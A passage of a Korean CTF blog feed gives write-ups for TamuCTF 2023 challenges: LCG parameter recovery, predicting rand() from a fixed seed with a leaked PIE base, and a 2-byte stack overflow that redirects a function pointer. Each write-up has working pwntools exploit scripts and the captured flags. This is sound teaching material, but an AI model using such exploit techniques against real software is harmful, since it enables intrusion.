class="number">13962790238404640136</span>, <span class="number">4201834617023485421</span>, <span class="number">13225427468977219878</span>, <span class="number">8664035747660142467</span>, <span class="number">7522656229844178580</span>, <span class="number">2554445795380876841</span>, <span class="number">10236063217894537554</span>, <span class="number">5312087233760129887</span>, <span class="number">16045881728967481568</span>, <span class="number">361194876183131301</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">reduce = functools.reduce</span><br><span class="line">gcd = math.gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">b, n</span>):</span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> x % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    <span class="comment"># print(&#x27;states&#x27;, states)</span></span><br><span class="line">    <span class="comment"># print(&#x27;modulus&#x27;, modulus)</span></span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> values <span class="keyword">in</span> value_arr:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m, c, a = crack_unknown_modulus(values[:<span class="number">5</span>])</span><br><span class="line">        <span class="built_in">print</span>(m, c, a)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li><code>solve.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line"><span class="comment"># seed = []</span></span><br><span class="line"><span class="comment"># for i in range(10):</span></span><br><span class="line"><span class="comment">#     seed.append(int(p.recvline(), 10))</span></span><br><span class="line"><span class="comment"># print(repr(seed))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">18446744073709551616</span></span><br><span class="line">c = <span class="number">69</span></span><br><span class="line">a = <span class="number">69</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.m = m</span><br><span class="line">        self.a = a</span><br><span class="line">        self.c = c</span><br><span class="line">        self.seed = seed</span><br><span class="line">        <span class="keyword">if</span> seed % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># initial state must be odd</span></span><br><span class="line">            self.seed += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;prng&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">values = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    values.append(<span class="built_in">int</span>(p.recvline(), <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">prng = Rand(values[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(prng.rand())</span><br><span class="line"><span class="comment"># print(values[-1])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># p.close()</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;D0nt_r0ll_y0uR_oWn_RnG&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
            <tag> crypto </tag>
            
            <tag> prng </tag>
            
            <tag> lcg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Unlocky (pwn, seed, rand)</title>
      <link href="/230503-tamu2023-2.Unlucky-pwn/"/>
      <url>/230503-tamu2023-2.Unlucky-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Luck won’t save you here. Have fun trying to get the flag!<br>Author: nhwn</p></blockquote><ul><li>[102 solves &#x2F; 398 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>바이너리와 c파일을 준다. 친절하다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed = <span class="number">69</span>;</span><br><span class="line">    srand(&amp;seed);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a lucky number: %p\n&quot;</span>, &amp;main);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> lol = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter lucky number #%d:\n&quot;</span>, i);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">        <span class="keyword">if</span> (rand() != input) &#123;</span><br><span class="line">            lol = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lol) &#123;</span><br><span class="line">        <span class="type">char</span> flag[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        FILE* f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        fread(flag, <span class="number">1</span>, <span class="keyword">sizeof</span>(flag), f);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nice work, here&#x27;s the flag: %s\n&quot;</span>, flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;How unlucky :pensive:&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pie가 걸려있는데 <code>main</code>을 출력해준다. 이것으로 <code>pie base</code>를 구할 수 있다.</p><p><code>rand()</code>를 예측하면 <code>flag</code>를 획득할 수 있다. 여기서 취약점은 <code>seed</code>가 고정되어 있어서 <code>rand()</code>를 예측할 수 있다. 이를 위해 c파일을 하나 만들어서 예측한 <code>rand()</code> 값을 받아와서 입력으로 넣어주면 될 듯 하다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>rand()</code>를 예측하기 위해 아래와 같은 c파일을 만들어서 컴파일한다. 우리는 문제 바이너리의 seed값 주소를 구소해서 인자로 넘겨주고 <code>srand()</code> 함수 인자로 사용해야 한다. 그리고 문제 바이너리에서 <code>rand()</code> 값을 7번 맞추는 것을 요구했기 때문에 이것을 그대로 c로 구현해준다. 잊지말아야할 것은 파이썬 스크립트에서 방금 만든 바이너리의 출력값을 받아와야한다는 사실이다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%d\n&quot;, atoi(argv[1]));</span></span><br><span class="line">srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="type">int</span> random = rand();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random1 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random2 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random2);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random3 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random3);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random4 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random4);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random5 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random5);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random6 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random6);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;unlucky&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./unlucky&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./unlucky&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x11a5</span></span><br><span class="line"></span><br><span class="line">seed = e.address + <span class="number">0x4068</span></span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line">random = subprocess.check_output([<span class="string">&#x27;./a.out&#x27;</span>, <span class="built_in">str</span>(seed)]).strip().split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">random = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> random]</span><br><span class="line"><span class="built_in">print</span>(random)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">0</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">1</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">2</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">3</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">4</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">5</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">6</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;1_n33d_b3tt3r_3ntr0py_s0urc3s&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rand </tag>
            
            <tag> seed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Pointers (pwn, 2bytes overflow)</title>
      <link href="/230503-tamu2023-3.Pointers-pwn/"/>
      <url>/230503-tamu2023-3.Pointers-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I’ve been messing with pointers lately which never goes wrong, right?<br>Author: anomie</p></blockquote><ul><li>[90 solves &#x2F; 421 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>바이너리와 소스코드를 제공해준다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">upkeep</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Not related to the challenge, just some stuff so the remote works correctly</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/cat&quot;</span>, <span class="string">&quot;flag.txt&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lose</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/echo&quot;</span>, <span class="string">&quot;loser&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">010</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Interaction pls: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    upkeep();</span><br><span class="line">    <span class="type">void</span>* func_ptrs[] = &#123;lose, win&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;All my functions are being stored at %p\n&quot;</span>, func_ptrs);</span><br><span class="line">    </span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="type">void</span> (*poggers)() = func_ptrs[<span class="number">0</span>];</span><br><span class="line">    poggers();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> 함수를 IDA로 살펴보면 아래와 같다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Interaction pls: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2byte overflow가 발생한다. 후에 <code>void (*poggers)() = func_ptrs[0];</code> 을 통해 <code>lose</code> 함수가 호출된다. 이 대신 <code>vuln</code> 함수의 overflow를 통해 <code>win</code> 함수가 호출되는 것이 목표이다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>처음에 출력해주는 함수 포인터 주소를 <code>0x7ffebafcc630</code>라고 하자. 이는 <code>lose</code> 함수 주소가 저장되어있고 +8한 <code>0x7ffebafcc638</code>에는 <code>win</code> 함수 주소가 저장되어있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">→ 0x5589074ca2c4 &lt;main+74&gt;        mov    rax, QWORD PTR [rbp-0x20]</span><br><span class="line">  0x5589074ca2c8 &lt;main+78&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line">  0x5589074ca2cc &lt;main+82&gt;        mov    rdx, QWORD PTR [rbp-0x8]</span><br><span class="line">  0x5589074ca2d0 &lt;main+86&gt;        mov    eax, 0x0</span><br><span class="line">  0x5589074ca2d5 &lt;main+91&gt;        call   rdx</span><br></pre></td></tr></table></figure><p><code>rbp-0x20</code> 주소에 저장된 값을 <code>rax</code>에 넣는다. 이 값이 전달되어 <code>rdx</code>에 들어가고 결국 <code>call rdx</code>를 실행한다. 결국 <code>rbp</code>에는 <code>0x7ffebafcc638 + 0x20</code> 값이 들어가야 한다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;pointers&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pointers&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;at &#x27;</span>)</span><br><span class="line">func_ptrs = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(func_ptrs)</span><br><span class="line"></span><br><span class="line">win = func_ptrs[-<span class="number">4</span>:]</span><br><span class="line"><span class="built_in">print</span>(win)</span><br><span class="line">win = <span class="built_in">int</span>(win, <span class="number">16</span>) + <span class="number">8</span> + <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line"><span class="comment"># real_win = int(func_ptrs, 16) + 8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p16(win)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;small_overflows_are_still_effective&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rbp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Randomness (pwn, fini)</title>
      <link href="/230503-tamu2023-4.Randomness-pwn/"/>
      <url>/230503-tamu2023-4.Randomness-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I made this program to test how srand and rand work, but it keeps segfaulting. I don’t read compiler warnings so I can’t figure out why it’s broken.<br>Author: anomie</p></blockquote><ul><li>[86 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>바이너리와 소스코드를 제공해준다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/cat&quot;</span>, <span class="string">&quot;flag.txt&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span 